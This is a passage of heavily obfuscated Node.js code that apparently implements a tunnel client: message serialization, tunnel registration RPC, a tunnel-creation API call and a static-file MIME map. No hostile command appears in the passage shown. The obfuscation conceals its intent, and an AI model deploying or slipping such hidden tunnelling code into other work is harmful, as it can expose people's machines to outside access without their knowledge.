            'RdWpU': function (d, f) {
                return d === f;
            },
            'QIIQQ': cA(0x181),
            'OgAYs': function (d, f) {
                return d === f;
            },
            'smegv': function (d, f) {
                return d === f;
            },
            'ruCIL': cA(0x2d8),
            'SQNAB': function (d, f) {
                return d === f;
            },
            'eAMTl': function (d, f) {
                return d === f;
            },
            'LOoHa': function (d, f) {
                return d === f;
            },
            'mWlQS': cA(0x5a1),
            'cbMKL': function (d, f) {
                return d === f;
            },
            'XaDwc': function (d, f) {
                return d === f;
            },
            'GmRxi': cA(0x178),
            'FUGLH': function (d, f, g, h) {
                return d(f, g, h);
            },
            'gwpPo': function (d, f) {
                return d(f);
            },
            'pjbFD': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[cA(0x31d)](d, b[cA(0x1c3)]) && b[cA(0x6db)](f, cA(0x30d)))
            c[cA(0x51c)](0x88);
        else {
            if (b[cA(0x6db)](d, b['QIIQQ']) && f === '204')
                c[cA(0x51c)](0x89);
            else {
                if (b[cA(0x713)](d, b[cA(0x1c3)]) && b[cA(0x31d)](f, b[cA(0x32d)]))
                    c['push'](0x8a);
                else {
                    if (b[cA(0x713)](d, b['QIIQQ']) && b[cA(0x5f2)](f, cA(0x584)))
                        c[cA(0x51c)](0x8b);
                    else {
                        if (b[cA(0x2eb)](d, b[cA(0x1c3)]) && b[cA(0x19d)](f, b['mWlQS']))
                            c['push'](0x8c);
                        else {
                            if (b['SQNAB'](d, b[cA(0x1c3)]) && b['cbMKL'](f, '404'))
                                c['push'](0x8d);
                            else
                                b['XaDwc'](d, b[cA(0x1c3)]) && f === b[cA(0x286)] ? c['push'](0x8e) : (c['push'](...b[cA(0x44f)](a0ac, 0x0, 0x4, 0x0)), c[cA(0x51c)](...b[cA(0x68e)](a0ad, d)), c['push'](...b[cA(0x651)](a0ad, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[cA(0x426)](c);
}
class a0af {
    constructor() {
        const cB = a0aO;
        this[cB(0x543)] = [];
    }
    [a0aO(0x53d)](a) {
        const cC = a0aO, b = {
                'ACZRv': function (d, f) {
                    return d < f;
                }
            }, c = this[cC(0x543)][cC(0x261)];
        for (let d = 0x0; b[cC(0x25b)](d, a); d++) {
            this[cC(0x543)]['push'](0x0n);
        }
        return c;
    }
    ['structPtr'](a, b, c, d) {
        const cD = a0aO, f = {
                'XYcpS': function (j, k) {
                    return j - k;
                },
                'uJrsz': function (j, k) {
                    return j & k;
                },
                'nlCRp': function (j, k) {
                    return j << k;
                },
                'sHpIz': function (j, k) {
                    return j(k);
                },
                'llapR': function (j, k) {
                    return j | k;
                }
            }, g = f[cD(0x5e3)](b - a, 0x1), h = f[cD(0x52e)](f[cD(0x74d)](f[cD(0x3b9)](BigInt, g), 0x2n), 0xfffffffcn), i = f['llapR'](f[cD(0x3b9)](BigInt, c & 0xffff), f[cD(0x74d)](f[cD(0x3b9)](BigInt, f[cD(0x52e)](d, 0xffff)), 0x10n));
        this[cD(0x543)][a] = f[cD(0x173)](h, f[cD(0x74d)](i, 0x20n));
    }
    ['setU8'](a, b, c) {
        const cE = a0aO, d = {
                'GfCvh': function (g, h) {
                    return g << h;
                },
                'QoXsI': function (g, h) {
                    return g(h);
                },
                'NCVet': function (g, h) {
                    return g * h;
                },
                'iqati': function (g, h) {
                    return g | h;
                },
                'wkTpB': function (g, h) {
                    return g & h;
                }
            }, f = d[cE(0x31c)](0xffn, d[cE(0x541)](BigInt, d[cE(0x46d)](b, 0x8)));
        this[cE(0x543)][a] = d[cE(0x3ea)](this[cE(0x543)][a] & ~f, d[cE(0x541)](BigInt, d['wkTpB'](c, 0xff)) << BigInt(d['NCVet'](b, 0x8)));
    }
    [a0aO(0x603)](a, b, c) {
        const cF = a0aO, d = {
                'ycvwU': function (g, h) {
                    return g << h;
                },
                'mTsdX': function (g, h) {
                    return g | h;
                },
                'yOojT': function (g, h) {
                    return g & h;
                },
                'sblif': function (g, h) {
                    return g(h);
                },
                'hlUuj': function (g, h) {
                    return g * h;
                }
            }, f = d[cF(0x329)](0xffffn, BigInt(b * 0x8));
        this[cF(0x543)][a] = d[cF(0x1fc)](d[cF(0x387)](this[cF(0x543)][a], ~f), BigInt(c & 0xffff) << d['sblif'](BigInt, d[cF(0x1d4)](b, 0x8)));
    }
    [a0aO(0x54f)](a, b, c) {
        const cG = a0aO, d = {
                'FzsDF': function (g, h) {
                    return g(h);
                },
                'qirdE': function (g, h) {
                    return g * h;
                },
                'gzHXZ': function (g, h) {
                    return g | h;
                },
                'xarBM': function (g, h) {
                    return g & h;
                },
                'DCtjy': function (g, h) {
                    return g << h;
                },
                'jMjVE': function (g, h) {
                    return g(h);
                },
                'XNdtR': function (g, h) {
                    return g & h;
                },
                'jcoLK': function (g, h) {
                    return g(h);
                }
            }, f = 0xffffffffn << d['FzsDF'](BigInt, d[cG(0x563)](b, 0x8));
        this[cG(0x543)][a] = d[cG(0x601)](d[cG(0x47c)](this[cG(0x543)][a], ~f), d[cG(0x1be)](d['jMjVE'](BigInt, d[cG(0x50d)](c, 0xffffffff)), d[cG(0x710)](BigInt, d[cG(0x563)](b, 0x8))));
    }
    [a0aO(0x664)](a, b) {
        const cH = a0aO, c = {
                'erJSQ': function (d, f) {
                    return d & f;
                },
                'UTQgd': function (d, f) {
                    return d(f);
                }
            };
        this[cH(0x543)][a] = c[cH(0x31e)](c['UTQgd'](BigInt, b), 0xffffffffffffffffn);
    }
    ['writeBytes'](a, b, c = ![]) {
        const cI = a0aO, d = {
                'bctrZ': function (m, n) {
                    return m === n;
                },
                'QZURx': cI(0x69d),
                'WijWI': cI(0x58c),
                'BMpSA': function (m, n) {
                    return m + n;
                },
                'PxRPl': function (m, n) {
                    return m / n;
                },
                'WljFL': function (m, n) {
                    return m < n;
                },
                'xsedL': function (m, n) {
                    return m / n;
                },
                'CUtXC': function (m, n) {
                    return m - n;
                },
                'OZwwj': function (m, n) {
                    return m & n;
                },
                'LOMzw': function (m, n) {
                    return m | n;
                },
                'zcvNM': function (m, n) {
                    return m << n;
                }
            }, f = d['bctrZ'](typeof b, d['QZURx']) ? Buffer[cI(0x426)](b, d[cI(0x21e)]) : b, g = d[cI(0x51a)](f[cI(0x261)], c ? 0x1 : 0x0), h = this['alloc'](Math[cI(0x790)](d[cI(0x34e)](g, 0x8)));
        for (let m = 0x0; d['WljFL'](m, f[cI(0x261)]); m++) {
            this[cI(0x30b)](h + Math[cI(0x6fd)](d[cI(0x2dd)](m, 0x8)), m % 0x8, f[m]);
        }
        const j = d[cI(0x728)](d[cI(0x728)](h, a), 0x1), k = d[cI(0x1f4)](BigInt(j) << 0x2n | 0x1n, 0xffffffffn), l = d[cI(0x44c)](0x2n, d[cI(0x1c5)](BigInt(g & 0x1fffffff), 0x3n));
        this[cI(0x543)][a] = k | d[cI(0x1c5)](l, 0x20n);
    }
    [a0aO(0x7be)](a, b) {
        const cJ = a0aO, c = {
                'WUBaG': function (g, h) {
                    return g | h;
                },
                'nPdzS': function (g, h) {
                    return g & h;
                },
                'JffiN': function (g, h) {
                    return g << h;
                },
                'QWahF': function (g, h) {
                    return g(h);
                },
                'mQKBg': function (g, h) {
                    return g + h;
                }
            };
        if (!b['length']) {
            this[cJ(0x543)][a] = 0x0n;
            return;
        }
        const d = this[cJ(0x53d)](b[cJ(0x261)]), f = d - a - 0x1;
        this[cJ(0x543)][a] = c[cJ(0x424)](c[cJ(0x2da)](c[cJ(0x424)](c['JffiN'](BigInt(f), 0x2n), 0x1n), 0xffffffffn), c[cJ(0x18c)](c[cJ(0x424)](0x6n, c[cJ(0x5d6)](BigInt, b[cJ(0x261)]) << 0x3n), 0x20n));
        for (let g = 0x0; g < b[cJ(0x261)]; g++) {
            this['writeBytes'](c['mQKBg'](d, g), b[g], !![]);
        }
    }
    ['finish']() {
        const cK = a0aO, a = {
                'vixXO': function (d, f) {
                    return d * f;
                },
                'CJXQr': function (d, f) {
                    return d < f;
                },
                'VypGH': function (d, f) {
                    return d & f;
                }
            }, b = Buffer['alloc'](0x8);
        b[cK(0x15b)](0x0, 0x0), b[cK(0x15b)](this[cK(0x543)]['length'], 0x4);
        const c = Buffer[cK(0x53d)](a['vixXO'](this[cK(0x543)][cK(0x261)], 0x8));
        for (let d = 0x0; a[cK(0x59f)](d, this['words'][cK(0x261)]); d++) {
            c['writeBigUInt64LE'](a[cK(0x618)](this[cK(0x543)][d], 0xffffffffffffffffn), a['vixXO'](d, 0x8));
        }
        return Buffer[cK(0x697)]([
            b,
            c
        ]);
    }
}
function a0ag(a) {
    const cL = a0aO, b = new a0af(), c = b[cL(0x53d)](0x1), d = b['alloc'](0x1), f = b[cL(0x53d)](0x1);
    b[cL(0x2e8)](c, d, 0x1, 0x1), b[cL(0x603)](d, 0x0, 0x8);
    const g = b[cL(0x53d)](0x1);
    return b[cL(0x53d)](0x1), b[cL(0x2e8)](f, g, 0x1, 0x1), b['setU32'](g, 0x0, a), b[cL(0x666)]();
}
function a0ah(a, b, c, d, f, g) {
    const cM = a0aO, h = {
            'cicHM': function (H, I) {
                return H | I;
            },
            'fPLDr': function (H, I) {
                return H & I;
            },
            'LVlBp': function (H, I) {
                return H & I;
            },
            'DVJeT': cM(0x5bf),
            'OtsMW': cM(0x30e),
            'vegUO': cM(0x69f),
            'hkmPr': 'Nexus-Python'
        }, i = new a0af(), j = i['alloc'](0x1), k = i['alloc'](0x1), l = i[cM(0x53d)](0x1);
    i[cM(0x2e8)](j, k, 0x1, 0x1), i[cM(0x603)](k, 0x0, 0x2);
    const m = i[cM(0x53d)](0x1), n = i['alloc'](0x1);
    i['alloc'](0x1);
    const o = i[cM(0x53d)](0x1), p = i[cM(0x53d)](0x1);
    i[cM(0x53d)](0x1), i['structPtr'](l, m, 0x3, 0x3), i[cM(0x54f)](m, 0x0, a), i['setU64'](n, 0xf71695ec7fe85497n);
    const q = i[cM(0x53d)](0x1), r = i[cM(0x53d)](0x1);
    i[cM(0x2e8)](o, q, 0x1, 0x1), i['setU16'](q, 0x4, 0x1);
    const s = i[cM(0x53d)](0x1);
    i['alloc'](0x1), i[cM(0x2e8)](r, s, 0x1, 0x1), i[cM(0x54f)](s, 0x0, b);
    const t = i['alloc'](0x1);
    i[cM(0x53d)](0x1), i[cM(0x2e8)](p, t, 0x0, 0x2);
    const u = i[cM(0x53d)](0x1), v = i[cM(0x53d)](0x1), w = i[cM(0x53d)](0x1), x = i[cM(0x53d)](0x1);
    i['structPtr'](t, u, 0x1, 0x3), i[cM(0x30b)](u, 0x0, g);
    const y = i['alloc'](0x1), z = i['alloc'](0x1);
    i[cM(0x2e8)](v, y, 0x0, 0x2), i[cM(0x5cf)](y, c, !![]), i[cM(0x5cf)](z, d), i['writeBytes'](w, f);
    const A = i[cM(0x53d)](0x1), B = i[cM(0x53d)](0x1);
    i[cM(0x53d)](0x1), i['structPtr'](x, A, 0x1, 0x2);
    const C = i[cM(0x53d)](0x1), D = i['alloc'](0x1), E = i[cM(0x53d)](0x1), F = i[cM(0x53d)](0x1);
    i[cM(0x2e8)](B, C, 0x0, 0x4);
    const G = a0k[cM(0x391)](0x10);
    return G[0x6] = h['cicHM'](h[cM(0x3dc)](G[0x6], 0xf), 0x40), G[0x8] = h[cM(0x53a)](h[cM(0x762)](G[0x8], 0x3f), 0x80), i[cM(0x5cf)](C, G), i['writeTextList'](D, [
        h['DVJeT'],
        h['OtsMW']
    ]), i[cM(0x5cf)](E, h[cM(0x225)], !![]), i['writeBytes'](F, h[cM(0x1b5)], !![]), i[cM(0x666)]();
}
function a0ai(a) {
    const cN = a0aO, b = {
            'lTAOK': function (f, g) {
                return f + g;
            },
            'aoxpm': function (f, g) {
                return f + g;
            },
            'YZIEs': function (f, g) {
                return f * g;
            },
            'nFCMk': function (f, g) {
                return f % g;
            },
            'LOdmN': function (f, g) {
                return f < g;
            },
            'bxLqv': function (f, g) {
                return f - g;
            },
            'vAzgF': function (f, g) {
                return f < g;
            },
            'dTHTt': function (f, g) {
                return f + g;
            },
            'qLbWU': function (f, g) {
                return f + g;
            },
            'EJeVK': function (f, g) {
                return f * g;
            },
            'oSrbS': function (f, g) {
                return f * g;
            },
            'PbKcz': cN(0x2fe),
            'yYkgL': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (a['length'] - d >= 0x8) {
        const f = a[cN(0x276)](d), g = a[cN(0x276)](b[cN(0x735)](d, 0x4)), h = b[cN(0x241)](f, 0x1);
        let j = 0x2 + h, k = b['YZIEs'](j, 0x4);
        b[cN(0x53e)](k, 0x8) && (k += 0x4);
        if (b[cN(0x5dc)](b[cN(0x1cd)](a['length'], d), k))
            break;
        const l = [g];
        for (let n = 0x1; b['vAzgF'](n, h); n++) {
            l['push'](a[cN(0x276)](b[cN(0x457)](b[cN(0x361)](d, 0x4), b[cN(0x59d)](n, 0x4))));
        }
        const m = b[cN(0x241)](k, b[cN(0x43f)](l[cN(0x24b)]((o, p) => o + p, 0x0), 0x8));
        if (a['length'] - d < m)
            break;
        if (h !== 0x1)
            throw new Error(b['PbKcz']);
        c[cN(0x51c)](a[cN(0x2a7)](b[cN(0x606)](d, k), d + m)), d += m;
    }
    return [
        c,
        a['subarray'](d)
    ];
}
function a0aj(a, b) {
    const cO = a0aO, c = {
            'NScFf': function (j, k) {
                return j >= k;
            },
            'qIxCq': cO(0x689),
            'ORgOG': function (j, k) {
                return j & k;
            },
            'lxbZE': cO(0x5eb),
            'cBrfj': function (j, k) {
                return j & k;
            },
            'Gkxys': function (j, k) {
                return j >> k;
            },
            'mNqNf': function (j, k) {
                return j + k;
            },
            'iYoRO': function (j, k) {
                return j >> k;
            },
            'YBtNW': function (j, k) {
                return j(k);
            },
            'XSBvS': function (j, k) {
                return j & k;
            },
            'ShJDk': function (j, k) {
                return j > k;
            },
            'rrUBe': function (j, k) {
                return j + k;
            },
            'XbZBU': function (j, k) {
                return j + k;
            }
        };
    if (c[cO(0x794)](b, a[cO(0x261)]))
        throw new Error(c[cO(0x334)]);
    const d = a[b];
    if (c[cO(0x581)](d, 0x3n) !== 0x0n)
        throw new Error(c[cO(0x36f)]);
    let f = c[cO(0x750)](c[cO(0x62e)](d, 0x2n), 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[cO(0x706)](b + 0x1, Number(f)), h = Number(c['iYoRO'](d, 0x20n) & 0xffffn), i = c[cO(0x2e5)](Number, c[cO(0x2b6)](d >> 0x30n, 0xffffn));
    if (g < 0x0 || c[cO(0x2c6)](c[cO(0x72a)](c[cO(0x260)](g, h), i), a['length']))
        throw new Error(c[cO(0x334)]);
    return [
        g,
        h,
        i
    ];
}
function a0ak(a, b) {
    const cP = a0aO, c = {
            'QazKS': function (m, n) {
                return m >= n;
            },
            'goZRf': function (m, n) {
                return m & n;
            },
            'oSBVf': function (m, n) {
                return m >> n;
            },
            'SiBEy': function (m, n) {
                return m + n;
            },
            'IePOA': function (m, n) {
                return m + n;
            },
            'onnjd': function (m, n) {
                return m(n);
            },
            'iuTEq': function (m, n) {
                return m & n;
            },
            'Pitso': function (m, n) {
                return m(n);
            },
            'fsWky': function (m, n) {
                return m >> n;
            },
            'wziqp': function (m, n) {
                return m / n;
            },
            'dWgVX': function (m, n) {
                return m !== n;
            },
            'pGEfJ': function (m, n) {
                return m < n;
            },
            'YUaNt': function (m, n) {
                return m > n;
            },
            'IzSaU': function (m, n) {
                return m * n;
            },
            'Bgntw': function (m, n) {
                return m < n;
            },
            'Kxxlf': function (m, n) {
                return m + n;
            },
            'VXeNu': function (m, n) {
                return m * n;
            },
            'yfKGW': cP(0x58c)
        };
    if (c[cP(0x3ff)](b, a[cP(0x261)]))
        return '';
    const d = a[b];
    if (c[cP(0x782)](d, 0x3n) !== 0x1n)
        return '';
    let f = c[cP(0x782)](c[cP(0x515)](d, 0x2n), 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[cP(0x443)](c['IePOA'](b, 0x1), Number(f)), h = c['onnjd'](Number, c['iuTEq'](c[cP(0x515)](d, 0x20n), 0x7n)), j = c[cP(0x389)](Number, c[cP(0x58f)](d, 0x23n)), k = Math[cP(0x790)](c[cP(0x42f)](j, 0x8));
    if (c[cP(0x50f)](h, 0x2) || c[cP(0x143)](g, 0x0) || c[cP(0x249)](c['IePOA'](g, k), a[cP(0x261)]))
        return '';
    const l = Buffer[cP(0x53d)](c[cP(0x468)](k, 0x8));
    for (let m = 0x0; c['Bgntw'](m, k); m++) {
        l[cP(0x367)](a[c[cP(0x4e7)](g, m)] & 0xffffffffffffffffn, c[cP(0x576)](m, 0x8));
    }
    return l[cP(0x2a7)](0x0, j)[cP(0x3e1)](c[cP(0x161)])[cP(0x479)](/\0+$/, '');
}
function a0al(a) {
    const cQ = a0aO, b = {
            'NKgia': function (z, A) {
                return z % A;
            },
            'bArJH': function (z, A) {
                return z < A;
            },
            'vmVZt': cQ(0x240),
            'RCDNP': function (z, A) {
                return z < A;
            },
            'jYzld': function (z, A) {
                return z / A;
            },
            'mDIhq': function (z, A) {
                return z * A;
            },
            'jRhxC': function (y, z, A) {
                return y(z, A);
            },
            'iThZx': function (z, A) {
                return z !== A;
            },
            'ihUjv': function (z, A) {
                return z & A;
            },
            'lUyMl': cQ(0x321),
            'iCtPV': function (y, z, A) {
                return y(z, A);
            },
            'YFpKO': function (z, A) {
                return z + A;
            },
            'zxUhI': function (y, z) {
                return y(z);
            },
            'GMYea': function (z, A) {
                return z >> A;
            },
            'qSAtd': function (y, z, A) {
                return y(z, A);
            },
            'iwWLS': function (z, A) {
                return z + A;
            },
            'hfixc': 'RPC\x20return\x20union\x20',
            'djktl': function (y, z, A) {
                return y(z, A);
            },
            'CoCra': function (z, A) {
                return z + A;
            },
            'BxLcG': function (y, z) {
                return y(z);
            },
            'yjasx': function (z, A) {
                return z === A;
            },
            'EAnlA': function (z, A) {
                return z + A;
            },
            'DKOiC': function (y, z, A) {
                return y(z, A);
            },
            'wXCBF': function (z, A) {
                return z + A;
            },
            'ECOcB': function (y, z) {
                return y(z);
            }
        };
    if (b[cQ(0x273)](a[cQ(0x261)], 0x8) || b[cQ(0x22a)](a['length'], 0x18))
        throw new Error(b[cQ(0x77a)]);
    const c = [];
    for (let y = 0x0; b['RCDNP'](y, b[cQ(0x5bd)](a['length'], 0x8)); y++) {
        c['push'](a['readBigUInt64LE'](b[cQ(0x60e)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b[cQ(0x4cf)](a0aj, c, 0x0);
    if (f < 0x1 || b[cQ(0x556)](b[cQ(0x633)](c[d], 0xffffn), 0x3n))
        throw new Error(b['lUyMl']);
    let h, j, k;
    [h, j, k] = b['iCtPV'](a0aj, c, b[cQ(0x6f9)](d, f));
    const l = b['zxUhI'](Number, b[cQ(0x633)](b[cQ(0x245)](c[h], 0x30n), 0xffffn));
    if (l === 0x1)
        return {
            'ok': ![],
            'error': b[cQ(0x26f)](a0ak, c, b[cQ(0x5e2)](h, j))
        };
    if (b[cQ(0x556)](l, 0x0))
        return {
            'ok': ![],
            'error': b[cQ(0x39e)] + l
        };
    let m, n, o;
    [m, n, o] = b[cQ(0x1dd)](a0aj, c, b[cQ(0x7a9)](h, j));
    let p, q, r;
    [p, q, r] = a0aj(c, b[cQ(0x5e2)](m, n));
    const s = c[p], t = b[cQ(0x63b)](Number, b[cQ(0x633)](s, 0xffffn));
    if (b[cQ(0x3d8)](t, 0x0))
        return {
            'ok': ![],
            'error': a0ak(c, p + q)
        };
    if (t !== 0x1)
        return {
            'ok': ![],
            'error': b['EAnlA']('registration\x20union\x20', t)
        };
    let u, v, w;
    [u, v, w] = b[cQ(0x4cf)](a0aj, c, b[cQ(0x6f9)](p, q));
    const x = b[cQ(0x6e2)](a0ak, c, b['wXCBF'](u + v, 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b['ECOcB'](Boolean, c[u] & 0x1n)
    };
}
const a0am = {
    '.js': a0aO(0x533),
    '.mjs': a0aO(0x533),
    '.css': a0aO(0x453),
    '.json': a0aO(0x3fb),
    '.map': a0aO(0x3fb),
    '.wasm': 'application/wasm',
    '.html': a0aO(0x702),
    '.htm': 'text/html;\x20charset=utf-8',
    '.svg': 'image/svg+xml',
    '.xml': a0aO(0x6c1),
    '.woff': a0aO(0x5b9),
    '.woff2': 'font/woff2',
    '.png': a0aO(0x6b5),
    '.jpg': a0aO(0x693),
    '.jpeg': 'image/jpeg',
    '.gif': a0aO(0x199),
    '.ico': a0aO(0x499)
};
function a0an(a) {
    const cR = a0aO, b = a[cR(0x7ab)]('/') ? a[cR(0x71b)](0x0, -0x1) : a, c = b[cR(0x566)]('.');
    if (c < 0x0)
        return '';
    return a0am[b[cR(0x71b)](c)['toLowerCase']()] || '';
}
function a0ao(a) {
    const cS = a0aO, b = {
            'OUnAe': function (c, d) {
                return c !== d;
            },
            'caAAv': cS(0x69d),
            'luSTe': function (c, d) {
                return c + d;
            },
            'gMWhi': function (c, d) {
                return c % d;
            }
        };
    if (Array[cS(0x649)](a))
        return Buffer[cS(0x426)](a);
    if (b[cS(0x2a4)](typeof a, b[cS(0x2a2)]))
        throw new Error(cS(0x47b));
    return Buffer[cS(0x426)](b['luSTe'](a, '='[cS(0x223)](b[cS(0x28e)](-a['length'], 0x4))), cS(0x3a2));
}
const a0ap = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0aq(a) {
    const cT = a0aO, b = {
            'sGOGL': cT(0x49c),
            'nzlaB': cT(0x755),
            'lHNqD': function (c, d) {
                return c + d;
            },
            'bYtrv': cT(0x490),
            'Tsjnp': cT(0x69d),
            'YfTxZ': cT(0x39f),
            'nvqKT': cT(0x1ac),
            'qcAxm': function (c, d) {
                return c(d);
            },
            'KgcZy': cT(0x15a),
            'iTNdm': function (c, d) {
                return c(d);
            },
            'crntR': cT(0x767),
            'XDfZy': function (c, d) {
                return c === d;
            },
            'aFDft': 'https:',
            'yFoIy': cT(0x590),
            'XGULr': 'cftunnel.js/1.0'
        };
    return new Promise((c, d) => {
        const cU = cT, f = {
                'Itatg': cU(0x58c),
                'SuauC': function (j, k) {
                    const cV = cU;
                    return b[cV(0x7b0)](j, k);
                },
                'kFqOT': cU(0x736),
                'ZpMZP': cU(0x5a5),
                'xSvAz': b[cU(0x54d)],
                'Zwofe': b[cU(0x60c)],
                'YrQcl': function (j, k) {
                    return j !== k;
                },
                'wuYyV': b[cU(0x609)],
                'WlrqG': b[cU(0x375)],
                'HqUeu': function (j, k) {
                    const cW = cU;
                    return b[cW(0x730)](j, k);
                }
            };
        let g;
        try {
            g = new URL(b[cU(0x7b0)](a[cU(0x479)](/\/+$/, ''), b[cU(0x670)]));
        } catch (j) {
            b[cU(0x1e7)](d, new Error(b[cU(0x7b0)](b[cU(0x36a)], j[cU(0x6ac)])));
            return;
        }
        const h = b['XDfZy'](g['protocol'], b[cU(0x73f)]) ? a0h : a0g, i = h['request'](g, {
                'method': cU(0x42b),
                'headers': {
                    'Content-Type': b[cU(0x1f8)],
                    'User-Agent': b[cU(0x394)]
                },
                'timeout': 0x3a98
            }, k => {
                const cX = cU, l = [];
                k['on'](cX(0x146), m => l['push'](m)), k['on'](b[cX(0x265)], d), k['on'](b[cX(0x1af)], () => {
                    const cY = cX, m = Buffer[cY(0x697)](l), n = k[cY(0x49b)];
                    let o;
                    try {
                        o = JSON[cY(0x439)](m[cY(0x3e1)](f['Itatg']));
                    } catch (q) {
                        d(new Error(f[cY(0x621)](f[cY(0x4a8)], n) + f[cY(0x5aa)] + m[cY(0x2a7)](0x0, 0x12c)[cY(0x3e1)](f['Itatg'])));
                        return;
                    }
                    const p = o[cY(0x58a)] || {};
                    if (!(o[cY(0x45c)] ?? !![]) || !p) {
                        d(new Error(f[cY(0x311)] + JSON[cY(0x698)](o['errors'])));
                        return;
                    }
                    try {
                        const r = String(p['id']);
                        if (!a0ap[cY(0x1ec)](r))
                            throw new Error('bad\x20tunnel\x20id');
                        if (typeof p['account_tag'] !== f[cY(0x38e)] || f['YrQcl'](typeof p[cY(0x5ec)], f[cY(0x38e)]))
                            throw new Error(f[cY(0x66a)]);
                        const s = a0ao(p[cY(0x333)]), t = Buffer[cY(0x426)](r['replace'](/-/g, ''), f[cY(0x6ff)]);
                        f['HqUeu'](c, [
                            p[cY(0x5ec)],
                            p[cY(0x259)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        d(new Error(cY(0x684) + u[cY(0x6ac)]));
                    }
                });
            });
        i['on']('error', k => d(new Error(cU(0x767) + k[cU(0x6ac)]))), i[cU(0x755)]();
    });
}
function a0ar(a) {
    const cZ = a0aO;
    return a[cZ(0x547)](([b, c]) => Buffer[cZ(0x426)](b, cZ(0x58c))[cZ(0x3e1)](cZ(0x3a2))[cZ(0x479)](/=+$/, '') + ':' + Buffer['from'](c, 'utf8')['toString'](cZ(0x3a2))[cZ(0x479)](/=+$/, ''))['join'](';');
}
class a0as {
    constructor(a) {
        const d0 = a0aO, b = {
                'YNohj': '0|6|4|7|3|8|1|5|2',
                'tPSpE': d0(0x49c),
                'mRJaW': d0(0x3f0),
                'TGtBs': d0(0x755),
                'amrYa': d0(0x146)
            }, c = b[d0(0x6a8)][d0(0x2c2)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[d0(0x602)] = a;
                continue;
            case '1':
                a['on'](b[d0(0x236)], f => {
                    const d1 = d0;
                    this[d1(0x14a)] = f, this[d1(0x21d)]();
                });
                continue;
            case '2':
                a['on'](b[d0(0x652)], () => {
                    const d2 = d0;
                    this[d2(0x4ba)] = !![], this[d2(0x21d)]();
                });
                continue;
            case '3':
                this['closed'] = ![];
                continue;
            case '4':
                this[d0(0x775)] = [];
                continue;
            case '5':
                a['on'](b[d0(0x540)], () => {
                    const d3 = d0;
                    this[d3(0x4ba)] = !![], this[d3(0x21d)]();
                });
                continue;
            case '6':
                this[d0(0x7aa)] = Buffer[d0(0x53d)](0x0);
                continue;
            case '7':
                this['errored'] = null;
                continue;
            case '8':
                a['on'](b[d0(0x31a)], f => {
                    const d4 = d0;
                    this[d4(0x7aa)] = this[d4(0x7aa)][d4(0x261)] ? Buffer[d4(0x697)]([
                        this[d4(0x7aa)],
                        f
                    ]) : f, this['_drain']();
                });
                continue;
            }
            break;
        }
    }
    ['_drain']() {
        const d5 = a0aO, a = {
                'LwjQR': function (b, c) {
                    return b > c;
                },
                'ebFxn': function (b, c) {
                    return b !== c;
                },
                'jOJwN': d5(0x244)
            };
        while (a[d5(0x3d5)](this[d5(0x775)][d5(0x261)], 0x0)) {
            const b = this[d5(0x775)][0x0];
            if (this['buffer']['length'] >= b[d5(0x234)]) {
                this[d5(0x775)][d5(0x54b)]();
                const c = this[d5(0x7aa)][d5(0x2a7)](0x0, b['need']);
                this[d5(0x7aa)] = this['buffer'][d5(0x2a7)](b[d5(0x234)]), b[d5(0x3be)](c);
            } else {
                if (a[d5(0x163)](this[d5(0x14a)], null))
                    this[d5(0x775)][d5(0x54b)](), b[d5(0x763)](this['errored']);
                else {
                    if (this[d5(0x4ba)])
                        this[d5(0x775)]['shift'](), b[d5(0x763)](new Error(a[d5(0x2a6)]));
                    else
                        break;
                }
            }
        }
    }
    [a0aO(0x5fc)](a) {
        const d6 = a0aO, b = {
                'ICKON': function (c, d) {
                    return c !== d;
                },
                'DVShj': function (c, d) {
                    return c >= d;
                }
            };
        if (b['ICKON'](this['errored'], null))
            return Promise[d6(0x763)](this[d6(0x14a)]);
        if (b['DVShj'](this['buffer'][d6(0x261)], a)) {
            const c = this[d6(0x7aa)]['subarray'](0x0, a);
            return this[d6(0x7aa)] = this[d6(0x7aa)][d6(0x2a7)](a), Promise[d6(0x3be)](c);
        }
        if (this[d6(0x4ba)])
            return Promise[d6(0x763)](new Error(d6(0x244)));
        return new Promise((d, f) => {
            const d7 = d6;
            this[d7(0x775)][d7(0x51c)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[d7(0x21d)]();
        });
    }
}
class a0at {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const d8 = a0aO, l = {
                'MoOZt': function (o, p) {
                    return o || p;
                }
            }, m = d8(0x600)[d8(0x2c2)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this[d8(0x6b8)] = h;
                continue;
            case '1':
                this[d8(0x6c9)] = a0a2;
                continue;
            case '2':
                this[d8(0x788)] = 0xffff;
                continue;
            case '3':
                this[d8(0x36d)] = i;
                continue;
            case '4':
                this['windowWaiters'] = [];
                continue;
            case '5':
                this[d8(0x17d)] = c;
                continue;
            case '6':
                this['connIndex'] = g;
                continue;
            case '7':
                this['tunnelId'] = f;
                continue;
            case '8':
                this['tunnelState'] = l[d8(0x5bc)](k, { 'printed': ![] });
                continue;
            case '9':
                this[d8(0x353)] = b;
                continue;
            case '10':
                this[d8(0x285)] = null;
                continue;
            case '11':
                this['reader'] = new a0as(a);
                continue;
            case '12':
                this[d8(0x1a0)] = j;
                continue;
            case '13':
                this[d8(0x3a5)] = new a0ab();
                continue;
            case '14':
                this[d8(0x371)] = new Map();
                continue;
            case '15':
                this[d8(0x532)] = new Map();
                continue;
            case '16':
                this[d8(0x729)] = ![];
                continue;
            case '17':
                this[d8(0x17c)] = d;
                continue;
            case '18':
                this[d8(0x7a6)] = a;
                continue;
            case '19':
                this[d8(0x591)] = ![];
                continue;
            }
            break;
        }
    }
    [a0aO(0x421)](a, b, c, d = Buffer[a0aO(0x53d)](0x0)) {
        const d9 = a0aO, f = {
                'tkFQy': function (h, i) {
                    return h > i;
                },
